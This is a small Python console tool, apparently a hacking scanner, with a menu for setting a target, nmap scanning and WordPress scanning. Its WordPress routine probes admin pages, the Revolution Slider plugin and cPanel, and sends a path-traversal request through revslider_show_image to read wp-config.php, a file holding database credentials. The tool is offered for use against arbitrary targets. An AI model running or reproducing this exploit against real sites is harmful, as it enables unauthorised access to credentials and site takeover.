from os import *
from nmap_scan import *
import requests

logo = """
\033[1;31;40m
                                        
                                        
     .                         .. ...   
    . .,..                   ,... ...   
    .......,                *..     .   
    .,.   ..**             (..    .     
    .      .,,,           ,..    . .    
     .      .,*           .       .     
      .       ...                .      
               .         .              
               .                        
              .****,,,,,,.              
            *///#((*((//*,,,            
          ..*/*/(##((#(//*,,..          
          ...*///,,.,*/**/***,.         
               , *,,,,,,.....,          
                 ./***(      .*         
          ,,...,.,,(#/#//(,./*          
            .,    ,##*.*...*.           
               ,       .**.*     ...    
            ..    . .    ...      ..    
                         /.             
                  .*,*.%,               
                                        

\033[0;37;40m
"""

help = """
\033[1;32;40m·─────────────────────────────────────────────────·
\033[1;32;40m|\033[1;33;40m set target      \033[1;32;40m└──>\033[1;33;40m set target for testing     \033[1;32;40m|
\033[1;32;40m|\033[1;33;40m scan nmap       \033[1;32;40m└──>\033[1;33;40m scan target with nmap      \033[1;32;40m|
\033[1;32;40m|\033[1;33;40m scan wordpress  \033[1;32;40m└──>\033[1;33;40m scan target with wordpress \033[1;32;40m|
\033[1;32;40m|\033[1;33;40m scan dork       \033[1;32;40m└──>\033[1;33;40m scan target with dorks     \033[1;32;40m|
\033[1;32;40m|\033[1;33;40m help            \033[1;32;40m└──>\033[1;33;40m help                       \033[1;32;40m|
\033[1;32;40m|\033[1;33;40m exit            \033[1;32;40m└──>\033[1;33;40m exit                       \033[1;32;40m|
\033[1;32;40m·─────────────────────────────────────────────────·
"""

print(logo)

x = ""
t = x
#print x+y[0]
"""
def test(url,mes,t):
	if url.status_code == t:
		print m
	else:
		print "error"
"""
def wp_scan(x):
	y = [
		"/wp-admin",
		"/wp-content/plugins/revslider/",
		"/wp-admin/admin-ajax.php?action=revslider_show_image&img=../wp-config.php",
		":2083"
	]
	m = [
		"\033[1;31;40m[!]\033[0;37;40m found wp-admin",
		"\033[1;31;40m[!]\033[0;37;40m found revslider_admin.php",
		"\033[1;31;40m[!]\033[0;37;40m found wp-config.php",
		"\033[1;31;40m[!]\033[0;37;40m found cpanel"
	]
	e = [
		"\033[1;32;40m[$]\033[0;37;40m not found wp-admin",
		"\033[1;32;40m[$]\033[0;37;40m not found revslider_admin.php",
		"\033[1;32;40m[$]\033[0;37;40m not found wp-config.php",
		"\033[1;32;40m[$]\033[0;37;40m not found cpanel"
	]
	p = [
		200,
		200,
		200,
		200
	]
	#x = input("target:")
	t = x
	#print x+y[0]
	def test(url,mes,t):
		if url.status_code == t:
			print(m)
		else:
			print("zaa")
	for i in range(0,len(y)):
		#print i
		x = t
		z = requests.get(x+y[i])
		#test(z,m[i],p[i])
		if z.status_code == p[i]:
			print(m[i])
		else:
			print(e[i])

def console():
	x = ""
	rpr = ""
	while True:
		logg = "\033[1;32;40m└─"+rpr+"─>\033[0;37;40m"
		cons = input(logg)
		if cons == "set target":
			x = input("target:")
			rpr = "[\033[1;31;40m"+x+"\033[1;32;40m]"
		if cons == "exit":
			exit()
		if cons == "help":
			print(help)
		if cons == "scan nmap":
			if x == "":
				print("\033[1;31;40merror\033[0;37;40m: target is null")
			else:
				nmap_scan(rpr,x)
		if cons == "scan wordpress":
			if x == "":
				print("\033[1;31;40merror\033[0;37;40m: target is null")
			else:
				wp_scan(x)
		
if __name__ == '__main__':
	console()
